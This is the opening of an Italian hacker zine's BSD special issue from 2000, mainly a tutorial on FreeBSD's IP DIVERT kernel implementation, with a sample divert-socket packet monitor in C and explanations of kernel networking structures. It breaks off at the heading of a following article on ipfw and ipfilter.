@@ -1,0 +1,3912 @@
+==============================================================================
+-------------[ PFi numero 2, anno 2 - 17/1/2000  - BSD SPECiAL! ]-------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in PFi ha fini eslusivamente informativi
+        ed educativi. L' autore di PFi non si ritiene in alcun modo
+        responsabile per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        PFi e' libero e autonomo mezzo di espressione; come io autore sono
+        libero di scrivere PFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita' per l'uso che farai delle
+        informazioni contenute in PFi.
+        Si vieta il posting di PFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite PFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+-[ COPYRiGHT ]----------------------------------------------------------------
+
+    cd /sys/sys
+    grep -i beer *
+    inflate.h: * "THE BEER-WARE LICENSE" (Revision 42)
+    ....
+    head inflate.h
+
+/*
+ * ----------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (Revision 42)
+ * <phk@login.dkuug.dk> wrote this file.  As long as you retain this notice you
+ * can do whatever you want with this stuff. If we meet some day, and you think
+ * this stuff is worth it, you can buy me a beer in return.   Poul-Hanning Kamp
+ * ----------------------------------------------------------------------------
+ .
+ .
+ .
+
+ pig -> I agree...
+
+-[ LOGO ]---------------------------------------------------------------------
+
+
+- sys/modules/syscons/daemon/daemon_saver.c -
+
+				           
+static char *daemon_pic[] = {              
+        "             ,        ,", 
+	"            /(        )`",    
+	"            \\ \\___   / |",
+	"            /- _  `-/  '",
+	"           (/\\/ \\ \\   /\\",
+	"           / /   | `    \\",
+	"           O O   ) /    |",
+	"           `-^--'`<     '",
+	"          (_.)  _  )   /",
+	"           `.___/`    /",
+	"             `-----' /",
+	"<----.     __ / __   \\",
+	"<----|====O)))==) \\) /====",
+	"<----'    `--' `.__,' \\",
+	"             |        |",
+	"              \\       /       /\\",
+	"         ______( (_  / \\______/",
+	"       ,'  ,-----'   |",
+	"       `--{__________)",
+	NULL
+};
+
+-[ iNDICE ]-------------------------------------------------------------------
+
+--- SPECiALE BSD
+
+1.		Introduzione
+2.		IP DIVERT: Analisi di un protocollo di rete in FreeBSD
+3.		KERNEL: ipfw Vs ipfilter
+4.		Network Kernel Hacking on a BSD box
+
+--- MiSC
+
+5.		MISC	
+6.		Conclusioni	
+
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+------------------------------[ iNTRODUZiONE ]--------------------------------
+
+Questa zine dovrebbe incuriosirvi a spulciare sul kernel....
+
+
+------------------------------------------------------------------------------
+--------[ IP DIVERT: Analisi di un protocollo di rete in FreeBSD ]------------
+------------------------------------------------------------------------------
+
+[ intro ]
+
+Questo articolo ha come scopo analizzare l'implementazione di un protocollo 
+in FreeBSD, un sistema operativo largamente utilizzato e che credo non abbia 
+bisogno di introduzione ... 
+La sua velocita' e la sua documentazione (che a mio avviso e' molto piu'
+abbondante di quanto alcune persone possano pensare) sono secondo me i punti 
+forti di questo S.O. il primo punto mi ha fatto sceglierlo rispetto a OpenBSD 
+che  sara' sicuro ma e' un pochino piu' lento e visto che mi ritrovo a lavorare
+su un computer un po' cessosetto e con un monitor B/N (malefico koba quando
+mi parla del suo computer con controcazzi hw, che a molti di voi potra'
+sembrare niente di speciale ma per un pezzente come me costa troppo) freebsd 
+me lo fa cmq sembrare una scheggia =) 
+Beh si ho abbastanza picchi ma nemmeno uno come cazzo si deve :)
+Scelgo FreeBSD perche' sto pure lavorando con belfa su un firewall personale 
+sviluppato su questa piattaforma che dopo vari testaggi :) vedremo di rendere 
+pubblico su bfi se a qualcuno interessa... 
+
+[ ringraziamenti ]
+
+Bob Dylan per avermi tenuto compagnia tutto questo periodo deprimente e 
+soprattutto consumistico che sono le feste...
+
+
+[ ptr ]
+
+    - man divert
+    - Networking Implementations Notes 4.4 BSD Edition
+
+Ed ora siamo a La Chorrera come nell'esperienza del libro Vere Allucinazioni
+di Terence McKenna solo che la foresta e' il kernel e i funghi sono le sue
+strutture...
+
+
+[ Alla ricerca dell' oo-koo-he' ]
+
+Un supporto per il divert e' principalmente un qualcosa che ci permette di
+dirottare una comunicazione da un destinatario ad un altro gran parte delle 
+volte nascondendo il tutto al mittente.
+Se vogliamo possiamo dire che questo sia prima di tutto un concetto sviluppato
+in telefonia ... ma e' largamente utilizzato in altri ambienti di rete per
+instradare pacchetti in entrata/uscita.
+Questo va bene come concetto generico ... vediamo pero' come si concretizza 
+in un sistema operativo come FreeBSD.
+
+Cominiciamo con il dire che il DIVERT e' un supporto che viene implementato nel
+kernel e che puo' essere utilizzato dal programmatore con una semplice chiamata
+socket con i seguenti parametri:
+
+	socket(PF_INET, SOCK_RAW, IPPROTO_DIVERT);
+
+Descrivendo un po' quello che viene detto facendo man divert... si tratta di
+un supporto molto simile ai sockets di tipo RAW con la distinzione pero' che
+possiamo utilizzare la bind() su una specifica divert port: l'indirizzo IP 
+del struttura sockaddr, fornita come parametro della bind, sara' ignorato.
+Una volta utilizzata la bind() il nostro socket ricevera' tutti i pacchetti
+che saranno dirottati a questa porta da parte per esempio di ipfw.
+
+In sostanza ogni pacchetto dirottato verso una divert port puo' facilmente
+essere letto attraverso una read(), una recv() o una recvfrom().
+Qui c'e' solo un eccezione per quanto riguarda la struttura sockaddr
+che troviamo tra i parametri di recvfrom(); in questo caso la porta 
+dell'indirizzo ritornato sara' uguale ad una tag di ipfw (in genere il numero
+della regola) e l'indirizzo ip sara' uguale a quello del primo indirizzo (ip) 
+dell'interfaccia che ha ricevuto il pacchetto o a INADDR_ANY se il pacchetto 
+era uscente.
+Okie diamo una spiegazione pratica che e' piu' comprensibile:
+
+---------- snip ----------
+		   
+/*
+ * div_test.c
+ * 
+ * AN EXAMPLE OF FREEBSD IPPROTO_DIVERT
+ *
+ * Read pfi for mysticism of oo-koo-he'
+ *
+ * Compile with: gcc -Wall div_test.c -o div_test
+ * 
+ *
+ * This source code tests packet received on a freebsd box with DIVERT kernel
+ * support ... there is no a magic aim ... you can consider it as an example to
+ * monitor packets with IPPROTO_DIVERT ...
+ *
+ * ex.:
+ *
+ * ipfw add 100 divert 1030 all from 192.168.1.1 to 192.168.1.2
+ * div_test
+ *
+ * after that send packets to port 1030 of your freebsd box ... and div_test
+ * shows you them... 
+ *
+ * to test outgoing packets use for example:
+ *
+ * ipfw add 100 divert 1030 all from 192.168.1.2 to any
+ *
+ * (I consider 192.168.1.2 your ip) and send pkt where you want ...
+ *
+ * note: this code doesn't send / process packets received from divert port...
+ *    
+ * 
+ * pigpen
+ * 
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in_systm.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/udp.h>
+#include <netinet/tcp.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <errno.h>
+
+
+int main (int argc, char **argv)
+{
+ int s_div, len, port=1030;
+ struct sockaddr_in sock_div, sock_o;
+ char 	buffer[2000];
+ struct protoent *proto;
+ struct ip  	 *IP;
+ struct icmp	 *ICMP;
+ struct udphdr 	 *UDP;
+ struct tcphdr 	 *TCP;
+
+ printf("----------------------\n");
+ printf("IPPROTO_DIVERT EXAMPLE\n");
+ printf("----------------------\n\n\n");
+
+ switch(argc) {
+ 	 case 2:	port = atoi(argv[1]);
+	 case 1:	
+			printf("port -> %d\n", port);	
+			fflush(stdout);
+			break;
+	 default:			
+	 	 	printf("usage: %s <bind port>\n",argv[0]);
+			exit(1);
+ }	 
+
+ s_div = socket(PF_INET, SOCK_RAW, IPPROTO_DIVERT);
+ if(s_div == -1) {
+	 perror("socket()");
+         exit(errno);
+ }
+  	 
+ sock_div.sin_family      = AF_INET;
+ sock_div.sin_port        = htons(port);
+ sock_div.sin_addr.s_addr = INADDR_ANY;
+
+ if(bind(s_div, (struct sockaddr *) &sock_div, sizeof(struct sockaddr)) < 0) {
+	  perror("bind()");
+	  exit(errno);
+ }
+ 
+ printf("Waiting for packets .... [ Ctrl-C to abort ]\n\n");
+ 
+ while(1) {
+	 
+  len = sizeof(sock_o);
+  if( recvfrom(s_div, buffer, sizeof(buffer), 0, 
+	              (struct sockaddr *) &sock_o, &len) ) {
+
+   printf("\nSocket analysis...\n");
+   printf("sock port -> %d\n", sock_o.sin_port);
+   printf("sock addr -> ");
+   
+   switch(sock_o.sin_addr.s_addr) {
+	   case INADDR_ANY:
+		   printf("outgoing packet\n");
+		   break;
+	   default:
+		   printf("%s\n", inet_ntoa(sock_o.sin_addr));
+		   break;
+   }
+   
+	  
+   IP = (struct ip *) buffer;
+   proto = getprotobynumber(IP->ip_p);
+   
+   if(proto)
+	   printf("Divert: Detect %s packet\n", proto->p_name);
+   
+   printf("from %s ",inet_ntoa(IP->ip_src));
+   
+   switch(IP->ip_p) {
+	   
+     case IPPROTO_UDP:
+      UDP = (struct udphdr *) ((char *)buffer + ((int)IP->ip_hl << 2));
+      printf("port: %d -> %d\n", 
+ 		 ntohs(UDP->uh_sport), ntohs(UDP->uh_dport));
+      break;
+      
+     case IPPROTO_TCP:
+      TCP = (struct tcphdr *) ((char *)buffer + ((int)IP->ip_hl << 2));
+      printf("port: %d -> %d\n",
+     		 ntohs(TCP->th_sport), ntohs(TCP->th_dport));
+      break;
+      
+     case IPPROTO_ICMP:
+      ICMP = (struct icmp *) ((char *)buffer + ((int)IP->ip_hl << 2));
+      printf("ICMP packet -- ");
+      switch(ICMP->icmp_type) {
+	      case ICMP_ECHOREPLY:
+		      printf("echo reply\n");
+		      break;
+	      case ICMP_ECHO:
+		      printf("echo\n");
+		      break;
+              default:
+		      printf("%d\n", ICMP->icmp_type);
+		      break;
+      }
+      break;
+   }		   
+  }
+ }
+ return 0;		 
+}
+	
+---------- snip ----------
+
+		   
+   Dal punto di vista del kernel ... Il supporto DIVERT non ha grosse
+   differenze da altri protocolli ... Attualmente ho visto il codice
+   su una versione CURRENT ma probabilmente non cambia niente o poco da 
+   versioni piu' stabili ... Per quanto riguarda le strutture utilizzate
+   per la connessione ci sono alcune differenze rispetto a quello che 
+   potete leggere sull'implementazione di una versione 4.4BSD di UNIX
+   compatibile per VAX.
+   Faccio notare che le Networking Implementations Notes 4.4BSD Edition
+   pur rifacendosi ad una versione Unix x VAX sono utilizzate anche come 
+   standard BSD per versioni di unix su altre architetture.
+   
+ 			          ...   ...
+		   
+
+   Il supporto per l'IP DIVERT va analizzato cominciando da due aspetti
+   fondamentali:
+
+1 - struttura di collegamento del protocollo al socket e struttura del 
+    protocollo
+
+    Per connettere il supporto al socket si usa la struttura pr_usrreqs del  
+    modulo protosw.h la quale contiene i puntatori alle funzioni necessarie ai
+    vari stati di connessione del protocollo... 
+
+    struct pr_usrreqs div_usreqs = {
+    	div_abort, pru_accept_notsupp, div_attach, div_bind,
+	pru_connect_notsupp, pru_connect2_notsupp, in_control, div_detach,
+	div_disconnect, pru_listen_notsupp, in_setpeeraddr, pru_rcvd_notsupp,
+	pru_rcvoob_notsupp, div_send, pru_sense_null, div_shutdown,
+	in_setsockaddr, sosend, soreceive, sopoll
+    };
+
+
+    In FreeBSD la struttura di interfacciamento del protocollo 
+    al socket (pr_usrreq) viene collegata alla struttura del protocollo
+    (protosw) attraverso un puntatore e la struttura viene registrata nella
+    tabella inetsw[] contenente tutti i protocolli x inet, come visibile in 
+    netinet/in_proto.c
+
+    struttura FreeBSD:
+
+    	struct protosw {		// struttura del protocollo
+		short pr_type;
+		struct domain *pr_domain;
+		short pr_protocol;
+		short pr_flags;
+
+		void (*pr_input) __P((struct mbuf *, int len));
+		
+		blablabla
+
+		struct pr_usrreqs *pr_usrreqs; <--- eccola qui!
+				// struttura di interfacciamento al socket
+	};
+
+
+
+    Qui c'e' da dire che lo standard 4.4BSD aveva definito una struttura
+    diversa in cui pr_usrreqs veniva gestito tramite puntatore a funzione
+    come potete dedurre dal paper Networking Implementations Notes 4.4BSD
+    Edition trovabile un po' ovunque ... (al limite chiedetelo a me
+    pero' prima date un'occhiata su /usr/share/doc/smm please :)  
+    Comunque nello standard BSD si trattava di gestire i vari stati di 
+    connessione attraverso i vari flag PRU_ATTACH, PRU_DETACH, PRU_LISTEN,
+    PRU_BIND ecc... che venivano passati alla funzione e in base a questo
+    si svolgeva il codice necessario invece con la struct pr_usrreqs abbiamo
+    per ognuno di questi stati un puntatore alla funzione che lo gestisce
+    cio' comporta abbastanza cicli di clock come deducibile da
+    sys/protosw.h e si tendera' nei prossimi kernel a migrare verso 
+    un'unica protosw contenente pure i membri di pr_usrreqs almeno cosi' 
+    sembra per ora ....
+
+    Riassumendo e spiegando il nocciolo della faccenda:
+
+    Per il dominio internet esiste una tabella chiamata inetsw[] che
+    contiene tutti i protocolli usati su inet; ognuno di questi e' una
+    struttura di tipo protosw che al suo interno contiene (tra le altre 
+    cose) pr_usrreqs (che rappresenta l'interfacciamento tra il protocollo
+    e le routines del socket), le funzioni per l'input e l'output del 
+    protocollo (nel nostro caso la div_input())
+    e per processare le opzioni del socket all'interno delle strutture 
+    di controllo inpcb (ip_ctloutput() )
+    Analizzando la struttura protosw definita sopra siamo sempre in grado
+    di dire se un protocollo appartiene a inet in quanto pr_domain e' 
+    settata alla struttura domain inetdomain trovabile in netinet/in_proto.c
+
+    Tabella di corrispondenza da protocollo e interfacciamento tra esso e il
+    socket
+
+	       protosw   .    pr_usrreqs
+		
+                 ...
+               / tcp    --->  tcp_usrreqs
+    inetsw[] /   udp    --->  udp_usrreqs
+             \   icmp   --->  rip_usrreqs
+	       \ divert --->  div_usrreqs
+		 ... 
+    
+
+    Tabella di corrispondenza dei campi della struttura protosw per il
+    supporto del divert
+
+		    protosw		valori		
+
+		    pr_type		SOCK_RAW	
+		    pr_domain		inet_domain	
+		    pr_protocol		IPPROTO_DIVERT	
+		    pr_flags		PR_ATOMIC 	
+		    			PR_ADDR
+		    pr_input()		div_input()	
+		    pr_output()		0
+		    pr_ctlinput()	0
+		    pr_ctloutput()	ip_ctloutput()
+		    pr_ousrreq()	0
+		    pr_init()		div_init()
+		    pr_fasttimo()	0
+		    pr_slowtimo()	0
+		    pr_drain()		0
+		    pr_usrreq()		div_usrreqs
+    
+    Una breve descrizione intuitiva dei membri della struttura la trovate nella 
+    definizione della struttura sys/protosw.h
+
+    Se vedete il sorgente notate che e' definita una funzione di nome
+    div_output() ma come vedete dalla tabella non si riferisce alla funzione di
+    gestione pr_output() infatti div_output() viene chiamata all'interno
+    della funzione div_send() ed e' un po' la chiave del supporto DIVERT in
+    quanto utilizza la ip_output() se come dal sorgente che ho scritto sopra
+    l'indirizzo non era specificato (case INADDR_ANY e cioe' il pacchetto e'
+    uscente) oppure la ip_input() se il pacchetto e' destinato all'indirizzo
+    (IP) di un'interfaccia del nostro sistema.
+
+2 - Funzione di inizializzazione del supporto (IP DIVERT)
+
+    Questo nuovo supporto che fino a questo momento supponiamo non esistere,
+    ha bisogno di una funzione di inizializzazione ....
+
+    Ma inizializzazione di cosa ?
+    Di una lista ... che gestira' le principali informazioni sullo stato
+    delle connessioni ...
+
+    // global variables
+
+    static struct inpcbhead divcb;
+    static struct inpcbinfo divcbinfo;
+
+
+    void
+    div_init(void)
+    {
+    	LIST_INIT(&divcb);
+	divcbinfo.listhead = &divcb;
+	divcbinfo.hashbase = hashinit(1, M_PCB, &divcbinfo.hashmask);
+	divcbinfo.porthashbase = hashinit(1, M_PCB, &divcbinfo.porthashmask);
+	divcbinfo.ipi_zone = zinit("divcb", sizeof(struct inpcb),
+				   maxsockets, ZONE_INTERRUPT, 0);
+    }				   
+	
+
+    Commentiamo queste poche righe:
+
+    ---> LIST_INIT(&divcb);
+
+    LIST_INIT() e' una macro definita in queue.h come segue:
+
+    	#define LIST_INIT(head) do {
+	        (head)->lh_first = NULL;
+		} while (0)
+ 
+    In realta' la lista e' soltanto una delle cinque strutture definite in
+    queue.h ognuna con le sue caratteristiche e le sue macro, merita fermarsi
+    a leggere quanto scritto sul modulo se non altro perche' sono concetti
+    di informatica che tornano sempre alla luce ... tutti i kernel utilizzano
+    strutture di linkaggio simili ....
+    Comunque questa macro non fa altro che mettere il campo lh_first della 
+    nostra testa della lista a NULL.
+    Occorre capire che tipo di dato sia divcb che come vediamo in
+    div_init() viene passato come argomento alla macro ... ebbene anche
+    inpcbhead e' definito tramite macro trovabile sempre in sys/queue.h:
+
+   #define LIST_HEAD(name, type)                                           
+    struct name {                                                           
+            struct type *lh_first;  /* first element */                     
+	    }
+
+   infatti in in_pcb.h troviamo:
+
+   LIST_HEAD(inpcbhead, inpcb);
+
+   quindi ne risulta:
+
+   struct inpcbhead {
+   	struct inpcb *lh_first;
+	}
+
+   Questo e' solo il prototipo ecco perche' a volte trovate cose del tipo:
+
+   LIST_HEAD(ip_fw_head, ip_fw_chain) ip_fw_chain;
+
+   In cui chiaramente il nome fuori dai parametri della macro e' il nome
+   della struttura;
+
+   oppure solo:
+
+   LIST_HEAD(,inpcb) divcb;
+
+   che viene adoperato nel caso divcb sara' l'unico tipo di struttura di quel
+   tipo e non si vuole il prototipo ... oddio ad un certo punto diventa solo
+   questione di stile ... non fatemela espandere va...
+   
+   Potete poi notare (sorgenti alla mano) che lo stesso
+   ragionamento potete applicarlo per derivare il tipo inpcbporthead.
+
+   Ad ogni modo nel prototipo inpcbhead si definisce in questo caso una struct
+   inpcb passandola per type, occorre quindi capire la struttura inpcb
+   che saranno gli elementi della nostra lista (la trovate in in_pcb.h).
+
+   Questa struct e' principalmente una struttura di controllo contenente
+   il socket, i campi che definiscono l'ip header, la porta locale e remota,
+   la route entry e altri campi ... viene utilizzata per avere informazioni
+   sulle connessioni di un particolare protocollo e potersi ricavare 
+   il socket, le porte ecc... di una di queste...
+
+   // internet protocol control block
+  
+   struct inpcb {
+          LIST_ENTRY(inpcb) inp_hash;     /* hash list */
+          struct  in_addr inp_faddr;      /* foreign host table entry */
+          struct  in_addr inp_laddr;      /* local host table entry */
+	  u_short inp_fport;              /* foreign port */
+	  u_short inp_lport;              /* local port */
+	  LIST_ENTRY(inpcb) inp_list;     /* list for all PCBs of this proto */
+	  caddr_t inp_ppcb;               /* pointer to per-protocol pcb */
+	  struct  inpcbinfo *inp_pcbinfo; /* PCB list info */
+	  struct  socket *inp_socket;     /* back pointer to socket */
+	  struct  mbuf *inp_options;      /* IP options */
+	  struct  route inp_route;        /* placeholder for routing entry */
+	  int     inp_flags;              /* generic IP/datagram flags */
+	  u_char  inp_ip_tos;             /* type of service proto */
+          u_char  inp_ip_ttl;             /* time to live proto */
+	  u_char  inp_ip_p;               /* protocol proto */
+          u_char  pad[1];                 /* alignment */
+	  struct  ip_moptions *inp_moptions; /* IP multicast options */
+	  LIST_ENTRY(inpcb) inp_portlist; /* list for this PCB's local port */
+	  struct  inpcbport *inp_phd;     /* head of this list */
+	  inp_gen_t inp_gencnt;          /* generation count of this instance*/
+   };
+
+
+   ---> divcbinfo.listhead = &divcb;
+ 
+   Con questa assegnazione comunichiamo alla struttura divcbinfo che divcb 
+   dovra' essere considerato come la testa della coda...
+
+   struct inpcbinfo {              /* XXX documentation, prefixes */
+           struct  inpcbhead *hashbase;
+	   u_long  hashmask;
+	   struct  inpcbporthead *porthashbase;     
+	   u_long  porthashmask;
+	   struct  inpcbhead *listhead;
+           u_short lastport;
+           u_short lastlow;
+           u_short lasthi;
+           struct  vm_zone *ipi_zone;   /* zone to allocate pcbs from */
+           u_int   ipi_count;	    /* number of pcbs in this list */
+           u_quad_t ipi_gencnt;     /* current generation count */
+   };
+
+  ---> divcbinfo.hashbase = hashinit(1, M_PCB, &divcbinfo.hashmask);
+
+  con questa istruzione inizializziamo una tabella hash che sara' accessibile
+  attraverso il puntatore hashbase.
+  La funzione hashinit ha il prototipo in sys/systm.h e la funzione in
+  kern/kern_subr.c
+
+  il primo parametro di questa funzione indica il numero di elementi, 
+  il secondo indica invece il tipo e l'ultimo e' l'hashmask calcolata su
+  hashsize come potete vedere dalla funzione:
+
+
+	void *
+	hashinit(elements, type, hashmask)
+	        int elements;
+	        struct malloc_type *type;
+	        u_long *hashmask;
+	{
+        	long hashsize;
+         	LIST_HEAD(generic, generic) *hashtbl;
+          	int i;
+						
+	        if (elements <= 0)
+        	     panic("hashinit: bad elements");
+          	for (hashsize = 1; hashsize <= elements; hashsize <<= 1)
+             	     continue;
+       	        hashsize >>= 1;
+         	hashtbl = malloc((u_long)hashsize * sizeof(*hashtbl), type,
+	  		   M_WAITOK);
+          	for (i = 0; i < hashsize; i++)
+          		LIST_INIT(&hashtbl[i]);
+          	*hashmask = hashsize - 1;
+          	return (hashtbl);
+	}
+
+   Bene ora che vi ho detto cio' sappiate che il supporto DIVERT non usa 
+   tabelle hash per cercare i propri elementi :) (anche se le rende
+   disponibili) ma semplicemente cerca fino a quando trova un inpcb uguale a 
+   NULL (partendo da divcb.lh_first) la div_input() descritta nella parte 
+   "Ricezione di un nuovo mbuf" e' un esempio di cio', quindi non lo fa 
+   tramite divcbinfo.
+   Cmq e' molto utile capire questa parte in quanto molti comuni protocolli
+   utilizzano questo metodo ricercando le specifiche connessioni attraverso 
+   per esempio le funzioni in_pcblookup_hash() e in_pcblookup_local() 
+   [in_pcb.c]
+
+   --->	divcbinfo.porthashbase = hashinit(1, M_PCB, &divcbinfo.porthashmask);	  
+   Qui vale il discorso di sopra applicato pero' a porthashbase...
+
+   ---> divcbinfo.ipi_zone = zinit("divcb", sizeof(struct inpcb),
+                                  maxsockets, ZONE_INTERRUPT, 0);
+
+    questa assegnazione conclude l'inizializzazione registrando il supporto
+    divcb ... 
+   
+    zinit() e' definita in vm/vm_zone.c
+    
+    il primo parametro e' il nome del supporto 
+    il secondo e' il tipo di questo
+    il terzo e' il massimo numero di entrate (diverso da 0 solo se il
+             parametro successivo e' di tipo ZONE_INTERRUPT altrimenti si
+	     considera che l'allocazione della zona sia illimitata)
+    il quinto e' il numero di pagine di memoria allocate quando cio' e' 
+    	     necessario (sempre che lo sia nel nostro caso no).
+
+
+		Come avviene la generazione dei pacchetti ?
+
+  Sostanzialmente qui si tratta di un'unica struttura su cui e' possibile
+  ricavare i vari layer (un po' come la sk_buff di linux ma con meno 
+  "succhiamenti" sugli allineamenti tra i vari layer ... grazie alle macro)
+
+  Anche qui lo standard 4.4BSD x VAX da' una struttura che in FreeBSD e'
+  rappresentata in modo diverso ma non importa soffermarsi su una
+  implementazione piuttosto che su un'altra quanto capire il ragionamento.
+
+  Ogni pacchetto che noi vogliamo far transitare deve essere rappresentato
+  in qualche modo, il modello ISO/OSI e quello semplificato ci indicano
+  i vari layer ... sappiamo che ogni layer ha la proprie strutture ....
+  Ebbene tutta questa roba finisce in mbuf e puo' essere estratta senza
+  impiantarsi troppo sugli allinementi mediante una macro di nome mtod()
+
+  es.
+
+  tcp  = mtod(m, struct tcpiphdr *)
+  ea   = mtod(m, struct etharp_arp *)
+  ar   = mtod(m, struct arp_hdr *)
+  igmp = mtod(m, struct igmp *)
+
+  etc....
+
+  La stessa cosa vale per il caricamento di una struttura dentro l'mbuf dove
+  la macro e' mdtom() ci sono poi altre macro per la concatenazione, copia 
+  dei pacchetti ecc...
+
+  4.4BSD ---> struttura mbuf 
+
+  struct mbuf {
+  	struct mbuf *m_next;
+	u_long m_off;   
+	short  m_len;   
+	short  m_type;  
+	u_char m_dat[MLEN]; 
+	struct mbuf *m_act; 
+   };
+
+   Importante e' l'offset in quanto mtod() per esempio ricavera' da dove
+   estrarre i dati in questo modo:
+
+   #define mtod(x,t) ((t)((int)(x) + (x)->m_off))
+
+   espandendo il primo esempio otteniamo:
+
+   mtod(m, struct tcpiphdr *) ((struct tpciphdr *)((int)(m) + (m)->m_off)
+
+   Anche qui si tratta di come sia stata implementata la struttura nel 
+   sistema operativo, FreeBSD per esempio ha la macro che non si basa su
+   un offset ma su data:
+
+   #define mtod(m,t)	((t)((m)->m_data))
+
+   Analizzando mbuf.h potete notare che data e' un membro della struttura
+   m_hdr e che la rappresentazione di mbuf e' chiaramente diversa da quella
+   precedente.
+
+			Ricezione di un nuovo mbuf
+
+   Abbiamo visto righe sopra che la div_input() rappresenta la funzione 
+   pr_input() del supporto divert... guardando come e' definito il suo
+   puntatore sulla struttura protosw capiamo che il primo parametro e'
+   l'mbuf che dovra' essere messo sulla coda del socket questo viene 
+   fatto nel modo seguente:
+
+   - ricerchiamo l'indirizzo ip dell'interfaccia dall'mbuf passato alla 
+     div_input()
+
+     for(ifa = m->m_pkthdr.rcvif->if_addrhead.tqh_first;
+          ifa != NULL; ifa = ifa->ifa_link.tqe_next) {
+	      if (ifa->ifa_addr == NULL)
+	      		continue;
+	      if (ifa->ifa_addr->sa_family != AF_INET)
+	      		continue;
+	      divsrc.sin_addr =
+	      		((struct sockaddr_in *) ifa->ifa_addr)->sin_addr;
+	      break; 
+     }
+
+   - ricerchiamo il socket ricavandolo dalla lista di strutture inpcb:
+
+   	sa = NULL;
+
+	for(inp = divcb.lh_first; inp != NULL; inp = inp->inp_list.le_next) {
+		if(inp->inp_lport == htons(ip_divert_port))
+			sa = inp->inp_socket;}
+
+	ip_divert_port = 0;		
+
+      sa e' ovviamente il socket, ip_divert_port viene generato da ip_input()
+      e ip_output() prima della div_input() e serve per poter ricercare il 
+      nostro inpcb... Subito dopo la ricerca viene infatti settato a 0
+
+   - appendiamo il pacchetto al socket trovato attraverso una sbappendaddr()
+
+      sbappendaddr(&sa->so_rcv, (struct sockaddr *)&divsrc, m, 
+      			(struct mbuf *)0)
+
+      (nota che so_rcv e' la coda dei pacchetti ricevuti per quel socket
+      se andate a guardare dentro le strutture sockbuf so_rcv e so_snd 
+      notate che esiste una catena di strutture mbuf (sb_mb), queste sono 
+      "agganciate" tra di loro da sbappendaddr() o da funzioni simili 
+      trovabili come questa in sys/kern/uipc_socket2.c)
+
+			
+   - si puo' quindi liberarsi dell'mbuf con una m_freem(m);
+
+			
+			Attaccare e staccare un inpcb
+
+   Quando utilizziamo una socket() occorre che il kernel verifichi se si
+   possano allocare altri sockets per quel tipo di protocollo (il cui limite
+   era stabilito come precedentemente visto con una zinit() ) e
+   successivamenti allochi, inizializzi e colleghi le strutture necessarie 
+   viceversa quando bisogna chiudere un socket occorre liberare l'inpcb ad esso
+   corrispondente. 
+
+   La protosw prevede due puntatori a funzione utilizzati uno per allocare 
+   un nuovo inpcb e l'altro per deallocarlo; nel supporto del divert viene  
+   fatto rispettivamente dalla funzione div_attach() e div_detach() che sono 
+   simili alle medesime funzioni in altri protocolli ...
+
+   La div_detach() ha come unico parametro il socket che viene utilizzato
+   per ricavare una struttura di tipo inpcb attraverso la sotoinpcb() per
+   poi passare tale struttura alla in_pcbdetach() che si occupera' di
+   deallocare tutti i campi della struttura inpcb.
+
+   static int
+   div_detach(struct socket *so)
+   {
+   	struct inpcb *inp;
+
+	inp = sotoinpcb(so); // = ((struct inpcb *)(so)->so_pcb)
+	if(inp == 0)
+		panic("div_detach");
+	in_pcbdetach(inp);
+	return 0;
+   }
+
+   Nota: la sotoinpcb() non e' altro che una macro semplicissima che ricava
+   l'inpcb da so_pcb della struttura socket tramite coercizione:
+
+   #define sotoinpcb(so)	((struct inpcb *)(so)->so_pcb)
+						[tratta da netinet/in_pcb.h]
+
+   La div_attach() e' un po' piu' complessa... ricava un inpcb dal socket come
+   la div_detach() poi blocca la ricezione con la splnet() allocando
+   quindi un inpcb e associando il socket ad esso tramite la in_pcballoc()
+   (la nuova struttura inpcb sara' accessibile attraverso il campo so_pcb
+   della struttura socket passata alla funzione) la splx() ripristina
+   la priorita' che c'era prima della splnet() a questo punto inp viene fatto 
+   puntare nuovamente all'inpcb del socket che viene settato tramite esso.
+   
+   La cosa sarebbe in realta' un po' piu' complessa in quanto la in_pcballoc() 
+   che si occupa di allocare una inpcb libera utilizza la zalloci() che prima 
+   di allocarla verifica se ci sono sockets liberi per quel protocollo tramite 
+   l'ipi_zone di divcbinfo (se proprio vogliamo essere precisi lo fa la 
+   _zalloc() chiamata dentro la zalloci() ) e successivamente si provvede 
+   all'inizializzazione (del socket) in caso affermativo.
+
+   static int
+   div_attach(struct socket *so, int proto, struct proc *p)
+   {
+   	struct inpcb *inp;
+	int error, s;
+
+	inp = sotoinpcb(so);
+	if (inp)
+		panic("div_attach");
+	if (p && (error = suser(p)) != 0) // check per vedere se abbiamo
+					  // permessi da figo (root)
+		return error;
+
+	s = splnet(); // blocco
+	error = in_pcballoc(so, &divcbinfo, p);
+	 // controllo sulla possibilita' di allocazione e successiva alloc. 
+	 // come spiegato sopra
+	splx(s); // sblocco
+	if (error)
+		return error;
+	inp = (struct inpcb *)so->so_pcb; // equivale alla macro sotoinpcb()
+	inp->inp_ip_p = proto;
+	inp->inp_flags |= INP_HDRINCL;
+
+	so->so_state != SS_ISCONNECTED;
+	return 0;
+   }
+
+
+Okie credo che basti ... non pretendo che capiate il tutto alla prima lettura
+ad ogni modo dopo avete le basi per poter analizzare qualsiasi protocollo...
+Non ho analizzato tutte le funzioni del protocollo divert in quanto quelle
+lasciate sono di facile comprensione e piuttosto brevi... per domande su
+questo articolo o altro sono contattabile su pigpen@s0ftpj.org.
+Spero che sia stata una lettura interessante, see you again...
+
+  
+
+
+
+------------------------------------------------------------------------------
+--------------------------[ KERNEL: ipfw vs ipfilter ]------------------------
+------------------------------------------------------------------------------
+
+- - - - - - - -
+
+0.0 Premessa
+
+1.0 Introduzione al supporto kernel di ipfw 
